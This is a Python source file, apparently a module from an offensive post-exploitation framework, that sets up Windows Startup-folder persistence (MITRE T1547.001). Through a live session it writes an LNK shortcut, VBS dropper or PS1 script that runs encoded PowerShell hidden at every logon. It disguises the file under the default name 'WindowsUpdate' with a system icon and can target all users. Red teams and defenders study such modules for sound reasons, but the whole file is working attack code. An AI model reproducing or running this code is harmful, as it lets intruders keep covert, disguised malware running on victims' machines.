"""persistence/startup_folder — LNK/VBS/PS1 startup folder persistence. MITRE T1547.001"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class StartupFolder(BasePlugin):
    NAME        = "startup_folder"
    DESCRIPTION = "Place LNK shortcut, VBS dropper, or PS1 script in Startup folder. All Users option."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1547.001"
    CATEGORY    = "persistence"
    schema      = ParamSchema().add(
        Param("action",    str,  required=False, default="add",
              help="add | remove | list"),
        Param("cmd",       str,  required=False, default="",
              help="Command/PS code to run on logon (required for add)"),
        Param("name",      str,  required=False, default="WindowsUpdate",
              help="Filename without extension (default: WindowsUpdate)"),
        Param("method",    str,  required=False, default="lnk",
              help="Delivery method: lnk | vbs | ps1"),
        Param("all_users", bool, required=False, default=False,
              help="Place in All Users startup (requires admin)"),
    )

    @mitre("T1547.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action    = params.get("action",    "add").lower()
        cmd       = params.get("cmd",       "")
        name      = params.get("name",      "WindowsUpdate")
        method    = params.get("method",    "lnk").lower()
        all_users = params.get("all_users", False)

        if all_users:
            startup = "\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""
        else:
            startup = "\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""

        if action == "list":
            ps = (
                f"$p={startup};"
                "Write-Output \"=== Startup: $p ===\";"
                "Get-ChildItem $p -Force -EA SilentlyContinue"
                "|Select-Object Name,Length,LastWriteTime|Format-Table -AutoSize;"
                "if(-not (Test-Path $p)){Write-Output '(folder not found)'}"
            )

        elif action == "remove":
            exts = ".lnk", ".vbs", ".ps1"
            checks = " ".join(
                f"Remove-Item \"$p\\{name}{e}\" -Force -EA SilentlyContinue; "
                for e in exts
            )
            ps = (
                f"$p={startup};"
                + checks
                + f"Write-Output '[+] Removed {name} from Startup (all variants)'"
            )

        else:  # add
            if not cmd:
                return ModuleResult.err("cmd is required for add")
            enc = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
            ps_cmd = f"powershell -nop -w hidden -NonInteractive -EncodedCommand {enc}"

            if method == "lnk":
                ps = (
                    f"$p={startup};"
                    f"$lnk_path=\"$p\\{name}.lnk\";"
                    "$sh=New-Object -ComObject WScript.Shell;"
                    "$lnk=$sh.CreateShortcut($lnk_path);"
                    "$lnk.TargetPath='powershell.exe';"
                    f"$lnk.Arguments='-nop -w hidden -NonInteractive -EncodedCommand {enc}';"
                    "$lnk.WindowStyle=7;"
                    "$lnk.IconLocation='%SystemRoot%\\system32\\shell32.dll,70';"
                    "$lnk.Save();"
                    f"Write-Output '[+] LNK created: ' + $lnk_path"
                )
            elif method == "vbs":
                vbs_content = f'CreateObject("WScript.Shell").Run "{ps_cmd}",0,False'
                safe_vbs = vbs_content.replace("'", "''")
                ps = (
                    f"$p={startup};"
                    f"$vbs_path=\"$p\\{name}.vbs\";"
                    f"Set-Content -Path $vbs_path -Value '{safe_vbs}';"
                    f"Write-Output '[+] VBS created: ' + $vbs_path"
                )
            else:  # ps1
                safe_enc = enc
                ps = (
                    f"$p={startup};"
                    f"$ps1_path=\"$p\\{name}.ps1\";"
                    f"Set-Content -Path $ps1_path -Value 'powershell -nop -w hidden -NonInteractive -EncodedCommand {safe_enc}';"
                    f"Write-Output '[+] PS1 created: ' + $ps1_path"
                )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"])
